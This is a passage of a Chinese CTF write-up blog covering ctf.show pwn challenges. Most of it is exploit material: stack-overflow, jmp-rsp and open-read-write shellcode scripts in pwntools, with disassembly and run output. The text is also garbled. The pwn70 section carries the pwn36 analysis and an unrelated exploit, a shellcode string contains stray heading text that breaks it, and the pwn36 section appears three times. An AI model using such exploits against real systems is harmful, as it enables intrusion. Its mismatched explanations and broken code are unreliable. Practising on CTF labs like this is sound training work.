class="string">&quot;mov rax,0x123000; jmp rax&quot;</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x28</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload += p64(jmp_rsp)+asm(<span class="string">&quot;sub rsp,0x30; jmp rsp&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;do&#x27;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">io.sendline(shellcode)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 288</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"></span><br><span class="line">No you don<span class="string">&#x27;t understand I say!</span></span><br><span class="line"><span class="string">flag&#123;just_test_my_process&#125;</span></span><br><span class="line"><span class="string">/ctfshowPH\x89\xe71\xd21\xf6j\x02X\x0f\x051\xc0j\x03_jdZ\xbe\x01\x01\x01\x01\x81\xf6\x011\x13\x01\x0f\x05j\x01_jdZ\xbe\x01\x01\x01\x01\x81\xf6\x011\x13\x01j\x01X\x0f\x05\x00\x00\x00\x00\x00\x00\x00\x00</span></span><br></pre></td></tr></table></figure>

<h2 id="pwn70"><a href="#pwn70" class="headerlink" title="pwn70"></a>pwn70</h2><p>Hint：可以开始你的个人秀了 flag文件位置为&#x2F;flag</p>
<p>checksec检查保护</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       amd64-64-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      Canary found</span><br><span class="line">  NX:         NX unknown - GNU_STACK missing</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stack:      Executable</span><br><span class="line">  RWX:        Has RWX segments</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure>

<p>64位程序部分开启RELRO，开启栈保护<br>告诉了我们flag文件位置，hint中还是让我们用ORW读flag，* Hint  : Try use ‘ORW’ to get flag</p>
<p>查看沙箱的情况：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ seccomp-tools dump ./pwn</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = <span class="built_in">arch</span></span><br><span class="line"> 0001: 0x15 0x00 0x05 0xc000003e  <span class="keyword">if</span> (A != ARCH_X86_64) goto 0007</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  <span class="keyword">if</span> (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x02 0xffffffff  <span class="keyword">if</span> (A != 0xffffffff) goto 0007</span><br><span class="line"> 0005: 0x15 0x01 0x00 0x0000003b  <span class="keyword">if</span> (A == execve) goto 0007</span><br><span class="line"> 0006: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br><span class="line"> 0007: 0x06 0x00 0x00 0x00000000  <span class="built_in">return</span> KILL</span><br></pre></td></tr></table></figure>

<p>1.程序只允许在 x86_64 架构下运行。</p>
<p>2.系统调用必须小于 0x40000000，否则拒绝执行。</p>
<p>3.特别地，如果系统调用是 execve（编号为 0x3b），则直接拒绝（KILL）。</p>
<p>需要注入shellcode来做，虽然有canary但是NX没开，栈还是能执行的。</p>
<p>ida 无法反汇编main：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000000400A68 main            proc near               ; DATA XREF: _start+1D↑o</span><br><span class="line">.text:0000000000400A68</span><br><span class="line">.text:0000000000400A68 var_80          = qword ptr -80h</span><br><span class="line">.text:0000000000400A68 var_74          = dword ptr -74h</span><br><span class="line">.text:0000000000400A68 s               = byte ptr -70h</span><br><span class="line">.text:0000000000400A68 var_8           = qword ptr -8</span><br><span class="line">.text:0000000000400A68</span><br><span class="line">.text:0000000000400A68 ; __unwind &#123;</span><br><span class="line">.text:0000000000400A68                 push    rbp</span><br><span class="line">.text:0000000000400A69                 mov     rbp, rsp</span><br><span class="line">.text:0000000000400A6C                 add     rsp, 0FFFFFFFFFFFFFF80h</span><br><span class="line">.text:0000000000400A70                 mov     [rbp+var_74], edi</span><br><span class="line">.text:0000000000400A73                 mov     [rbp+var_80], rsi</span><br><span class="line">.text:0000000000400A77                 mov     rax, fs:28h</span><br><span class="line">.text:0000000000400A80                 mov     [rbp+var_8], rax</span><br><span class="line">.text:0000000000400A84                 xor     eax, eax</span><br><span class="line">.text:0000000000400A86                 mov     eax, 0</span><br><span class="line">.text:0000000000400A8B                 call    init</span><br><span class="line">.text:0000000000400A90                 mov     eax, 0</span><br><span class="line">.text:0000000000400A95                 call    set_secommp   #沙箱</span><br><span class="line">.text:0000000000400A9A                 lea     rax, [rbp+s]</span><br><span class="line">.text:0000000000400A9E                 mov     esi, 68h ; &#x27;h&#x27;  ; n</span><br><span class="line">.text:0000000000400AA3                 mov     rdi, rax        ; s</span><br><span class="line">.text:0000000000400AA6                 call    _bzero</span><br><span class="line">.text:0000000000400AAB                 mov     eax, 0</span><br><span class="line">.text:0000000000400AB0                 call    logo</span><br><span class="line">.text:0000000000400AB5                 lea     rdi, aWelcomeTellMeY ; &quot;Welcome,tell me your name:&quot;</span><br><span class="line">.text:0000000000400ABC                 call    _puts</span><br><span class="line">.text:0000000000400AC1                 lea     rax, [rbp+s]</span><br><span class="line">.text:0000000000400AC5                 mov     edx, 64h ; &#x27;d&#x27;  ; nbytes</span><br><span class="line">.text:0000000000400ACA                 mov     rsi, rax        ; buf</span><br><span class="line">.text:0000000000400ACD                 mov     edi, 0          ; fd</span><br><span class="line">.text:0000000000400AD2                 mov     eax, 0</span><br><span class="line">.text:0000000000400AD7                 call    _read</span><br><span class="line">.text:0000000000400ADC                 sub     eax, 1</span><br><span class="line">.text:0000000000400ADF                 cdqe</span><br><span class="line">.text:0000000000400AE1                 mov     [rbp+rax+s], 0</span><br><span class="line">.text:0000000000400AE6                 lea     rax, [rbp+s]</span><br><span class="line">.text:0000000000400AEA                 mov     rdi, rax</span><br><span class="line">.text:0000000000400AED                 call    is_printable</span><br><span class="line">.text:0000000000400AF2                 test    eax, eax</span><br><span class="line">.text:0000000000400AF4                 jz      short loc_400AFE</span><br><span class="line">.text:0000000000400AF6                 lea     rax, [rbp+s]</span><br><span class="line">.text:0000000000400AFA                 call    rax</span><br><span class="line">.text:0000000000400AFC                 jmp     short loc_400B0A</span><br></pre></td></tr></table></figure>

<p>is_printable:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00000000004008EA is_printable    proc near               ; CODE XREF: main+85↓p</span><br><span class="line">.text:00000000004008EA</span><br><span class="line">.text:00000000004008EA s               = qword ptr -28h</span><br><span class="line">.text:00000000004008EA var_14          = dword ptr -14h</span><br><span class="line">.text:00000000004008EA</span><br><span class="line">.text:00000000004008EA ; __unwind &#123;</span><br><span class="line">.text:00000000004008EA                 push    rbp</span><br><span class="line">.text:00000000004008EB                 mov     rbp, rsp</span><br><span class="line">.text:00000000004008EE                 push    rbx</span><br><span class="line">.text:00000000004008EF                 sub     rsp, 28h</span><br><span class="line">.text:00000000004008F3                 mov     [rbp+s], rdi</span><br><span class="line">.text:00000000004008F7                 mov     [rbp+var_14], 0</span><br><span class="line">.text:00000000004008FE                 jmp     short loc_400933</span><br><span class="line">.text:0000000000400900 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000000400900</span><br><span class="line">.text:0000000000400900 loc_400900:                             ; CODE XREF: is_printable+5E↓j</span><br><span class="line">.text:0000000000400900                 mov     eax, [rbp+var_14]</span><br><span class="line">.text:0000000000400903                 movsxd  rdx, eax</span><br><span class="line">.text:0000000000400906                 mov     rax, [rbp+s]</span><br><span class="line">.text:000000000040090A                 add     rax, rdx</span><br><span class="line">.text:000000000040090D                 movzx   eax, byte ptr [rax]</span><br><span class="line">.text:0000000000400910                 cmp     al, 1Fh</span><br><span class="line">.text:0000000000400912                 jle     short loc_400928</span><br><span class="line">.text:0000000000400914                 mov     eax, [rbp+var_14]</span><br><span class="line">.text:0000000000400917                 movsxd  rdx, eax</span><br><span class="line">.text:000000000040091A                 mov     rax, [rbp+s]</span><br><span class="line">.text:000000000040091E                 add     rax, rdx</span><br><span class="line">.text:0000000000400921                 movzx   eax, byte ptr [rax]</span><br><span class="line">.text:0000000000400924                 cmp     al, 7Fh</span><br><span class="line">.text:0000000000400926                 jnz     short loc_40092F</span><br><span class="line">.text:0000000000400928</span><br><span class="line">.text:0000000000400928 loc_400928:                             ; CODE XREF: is_printable+28↑j</span><br><span class="line">.text:0000000000400928                 mov     eax, 0</span><br><span class="line">.text:000000000040092D                 jmp     short loc_40094F</span><br><span class="line">.text:000000000040092F ; ---------------------------------------------------------------------------</span><br><span class="line">.text:000000000040092F</span><br><span class="line">.text:000000000040092F loc_40092F:                             ; CODE XREF: is_printable+3C↑j</span><br><span class="line">.text:000000000040092F                 add     [rbp+var_14], 1</span><br><span class="line">.text:0000000000400933</span><br><span class="line">.text:0000000000400933 loc_400933:                             ; CODE XREF: is_printable+14↑j</span><br><span class="line">.text:0000000000400933                 mov     eax, [rbp+var_14]</span><br><span class="line">.text:0000000000400936                 movsxd  rbx, eax</span><br><span class="line">.text:0000000000400939                 mov     rax, [rbp+s]</span><br><span class="line">.text:000000000040093D                 mov     rdi, rax        ; s</span><br><span class="line">.text:0000000000400940                 call    _strlen</span><br><span class="line">.text:0000000000400945                 cmp     rbx, rax</span><br><span class="line">.text:0000000000400948                 jb      short loc_400900</span><br><span class="line">.text:000000000040094A                 mov     eax, 1</span><br><span class="line">.text:000000000040094F</span><br><span class="line">.text:000000000040094F loc_40094F:                             ; CODE XREF: is_printable+43↑j</span><br><span class="line">.text:000000000040094F                 add     rsp, 28h</span><br><span class="line">.text:0000000000400953                 pop     rbx</span><br><span class="line">.text:0000000000400954                 pop     rbp</span><br><span class="line">.text:0000000000400955                 retn</span><br><span class="line">.text:0000000000400955 ; &#125; // starts at 4008EA</span><br><span class="line">.text:0000000000400955 is_printable    endp</span><br></pre></td></tr></table></figure>

<p>使用 gets 函数从标准输入读取一行字符串，并将其存储在 s 数组中。然后，返回指向 s 的指针。 gets 函数是非常不安全的，容易导致缓冲区溢出漏洞。因为它无法限制输入的长度，可能会超出s 数组的容量，导致覆盖栈上的其他数据或执行任意代码。这也是明显的栈溢出漏洞，s距ebp仅有0x28，而gets不限制输入长度。</p>
<p>还在程序中找到了get_flag函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">get_flag</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [esp+Ch] [ebp-4Ch] BYREF</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">&quot;/ctfshow_flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;/ctfshow_flag: No such file or directory.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(s, <span class="number">64</span>, stream);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因此我们只需要利用栈溢出漏洞覆盖返回地址，将程序的执行流程转向 get_flag 函数，从而获取flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment"># p=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>,<span class="number">28280</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;name:\n&quot;</span>)</span><br><span class="line">shellcode = <span class="string">b&#x27;\x00\xc0&#x27;</span> + asm(shellcraft.cat(<span class="string">&#x27;flag&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line">from pwn import *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,<span class="built_in">arch</span>=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,28175)</span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">//调用open()</span></span><br><span class="line"><span class="string">push 0</span></span><br><span class="line"><span class="string">//绕过strlen()检查</span></span><br><span class="line"><span class="string">mov r15, 0x67616c66</span></span><br><span class="line"><span class="string">push r15</span></span><br><span class="line"><span class="string">mov rdi, rsp</span></span><br><span class="line"><span class="string">mov rsi, 0</span></span><br><span class="line"><span class="string">mov rax, 2</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">pwn 071</span></span><br><span class="line"><span class="string">题目环境：</span></span><br><span class="line"><span class="string">//调用read()</span></span><br><span class="line"><span class="string">mov r14, 3</span></span><br><span class="line"><span class="string">mov rdi, r14</span></span><br><span class="line"><span class="string">mov rsi, rsp</span></span><br><span class="line"><span class="string">mov rdx, 0xff</span></span><br><span class="line"><span class="string">mov rax, 0</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">//调用write()</span></span><br><span class="line"><span class="string">mov rdi,1</span></span><br><span class="line"><span class="string">mov rsi, rsp</span></span><br><span class="line"><span class="string">mov rdx, 0xff</span></span><br><span class="line"><span class="string">mov rax, 1</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;</span><span class="string">&#x27;&#x27;</span></span><br><span class="line">payload = asm(shellcode)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="pwn36-1"><a href="#pwn36-1" class="headerlink" title="pwn36"></a>pwn36</h2><p>Hint：存在后门函数，如何利用？</p>
<p>checksec检查保护</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       i386-32-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX unknown - GNU_STACK missing</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stack:      Executable</span><br><span class="line">  RWX:        Has RWX segments</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure>

<p>32位保护仅部分开启RELRO，同时注意到有可读可写可执行的段</p>
<p>32位IDA查看main函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804883C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80488B0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804892C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80489B8);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048A48);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048ACC);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048B60);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Type  : Stack_Overflow                                          &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Site  : https://ctf.show/                                       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Hint  : There are backdoor functions here!                      &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Find and use it!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter what you want: &quot;</span>);</span><br><span class="line">  ctfshow();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进ctfshow函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">36</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> gets(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用 gets 函数从标准输入读取一行字符串，并将其存储在 s 数组中。然后，返回指向 s 的指针。 gets 函数是非常不安全的，容易导致缓冲区溢出漏洞。因为它无法限制输入的长度，可能会超出s 数组的容量，导致覆盖栈上的其他数据或执行任意代码。这也是明显的栈溢出漏洞，s距ebp仅有0x28，而gets不限制输入长度。</p>
<p>还在程序中找到了get_flag函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">get_flag</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [esp+Ch] [ebp-4Ch] BYREF</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">&quot;/ctfshow_flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;/ctfshow_flag: No such file or directory.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(s, <span class="number">64</span>, stream);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因此我们只需要利用栈溢出漏洞覆盖返回地址，将程序的执行流程转向 get_flag 函数，从而获取flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">flag=elf.sym[<span class="string">&#x27;get_flag&#x27;</span>]</span><br><span class="line">payload=cyclic(<span class="number">0x28</span>+<span class="number">4</span>)+p32(flag)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 872</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/pwn&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    RWX:        Has RWX segments</span><br><span class="line">    Stripped:   No</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Stack_Overflow</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : There are backdoor <span class="built_in">functions</span> here!</span><br><span class="line">    * *************************************</span><br><span class="line">Find and use it!</span><br><span class="line">Enter what you want:</span><br><span class="line">flag&#123;just_test_my_process&#125;</span><br></pre></td></tr></table></figure>

<h2 id="pwn36-2"><a href="#pwn36-2" class="headerlink" title="pwn36"></a>pwn36</h2><p>Hint：存在后门函数，如何利用？</p>
<p>checksec检查保护</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       i386-32-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX unknown - GNU_STACK missing</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stack:      Executable</span><br><span class="line">  RWX:        Has RWX segments</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure>

<p>32位保护仅部分开启RELRO，同时注意到有可读可写可执行的段</p>
<p>32位IDA查看main函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804883C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80488B0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804892C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80489B8);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048A48);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048ACC);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048B60);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Type  : Stack_Overflow                                          &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Site  : https://ctf.show/                                       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Hint  : There are backdoor functions here!                      &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Find and use it!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter what you want: &quot;</span>);</span><br><span class="line">  ctfshow();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进ctfshow函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">36</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> gets(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用 gets 函数从标准输入读取一行字符串，并将其存储在 s 数组中。然后，返回指向 s 的指针。 gets 函数是非常不安全的，容易导致缓冲区溢出漏洞。因为它无法限制输入的长度，可能会超出s 数组的容量，导致覆盖栈上的其他数据或执行任意代码。这也是明显的栈溢出漏洞，s距ebp仅有0x28，而gets不限制输入长度。</p>
<p>还在程序中找到了get_flag函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">get_flag</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [esp+Ch] [ebp-4Ch] BYREF</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">&quot;/ctfshow_flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;/ctfshow_flag: No such file or directory.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(s, <span class="number">64</span>, stream);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因此我们只需要利用栈溢出漏洞覆盖返回地址，将程序的执行流程转向 get_flag 函数，从而获取flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">flag=elf.sym[<span class="string">&#x27;get_flag&#x27;</span>]</span><br><span class="line">payload=cyclic(<span class="number">0x28</span>+<span class="number">4</span>)+p32(flag)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 872</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/pwn&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    RWX:        Has RWX segments</span><br><span class="line">    Stripped:   No</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Stack_Overflow</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : There are backdoor <span class="built_in">functions</span> here!</span><br><span class="line">    * *************************************</span><br><span class="line">Find and use it!</span><br><span class="line">Enter what you want:</span><br><span class="line">flag&#123;just_test_my_process&#125;</span><br></pre></td></tr></table></figure>

<h2 id="pwn36-3"><a href="#pwn36-3" class="headerlink" title="pwn36"></a>pwn36</h2><p>Hint：存在后门函数，如何利用？</p>
<p>checksec检查保护</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       i386-32-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX unknown - GNU_STACK missing</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stack:      Executable</span><br><span class="line">  RWX:        Has RWX segments</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure>

<p>32位保护仅部分开启RELRO，同时注意到有可读可写可执行的段</p>
<p>32位IDA查看main函数：</p>
